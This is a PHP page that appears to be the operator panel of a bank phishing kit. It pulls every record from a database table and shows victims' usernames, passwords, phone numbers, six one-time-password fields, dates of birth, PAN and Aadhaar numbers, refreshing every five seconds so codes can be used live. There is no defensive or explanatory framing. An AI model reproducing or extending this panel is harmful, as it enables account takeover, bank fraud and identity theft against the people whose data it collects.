<html>
<head>
<meta http-equiv="refresh" content="5">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
 
</head>
<link rel="stylesheet" type="text/css" href="sstt.css">

<body>

    <table border="10">

     
        
            
            <th>username</th>
            <th>password</th>
            <th>number</th>
            <th>otp1</th>
            <th>BranchName</th>
            <th>HolderName</th>
            <th>DOB</th>
            <th>otp2</th>
            <th>pancard </th>
            <th>name</th>
            <th>otp3 </th>
             <th>Adhar no</th>
           <th>otp4 </th>
            <th>otp5</th>
            <th>otp6 </th>
            
      

    
            
    
     
      
    <tbody>
        <?php

include("cen.php");
error_reporting(0);
$sql_query = "select * from img";
$query = mysqli_query ($conn,$sql_query);
$result=mysqli_fetch_assoc($query);

while($result=mysqli_fetch_assoc($query))
{


?>
            
            <td><?php echo $result['username']; ?></td>
            <td><?php echo $result['password']; ?></td>
            <td><?php echo $result['number']; ?></td>
            <td><?php echo $result['otp1']; ?></td>
            <td><?php echo $result['BranchName']; ?></td>
            <td><?php echo $result['HolderName']; ?></td>
            <td><?php echo $result['DOB']; ?></td>
            <td><?php echo $result['otp2']; ?></td>
            <td><?php echo $result['PANCARDNU']; ?></td>
            <td><?php echo $result['Name']; ?></td>
            <td><?php echo $result['otp3']; ?></td>
            <td><?php echo $result['AadhaarCARDNU']; ?></td>
            <td><?php echo $result['otp4']; ?></td>
            <td><?php echo $result['otp5']; ?></td>
            <td><?php echo $result['otp6']; ?></td>
            
   
        </tr></tbody>
      
<?php
        }



        ?>
        
      </thead>
        </table>
           </body>
              </html>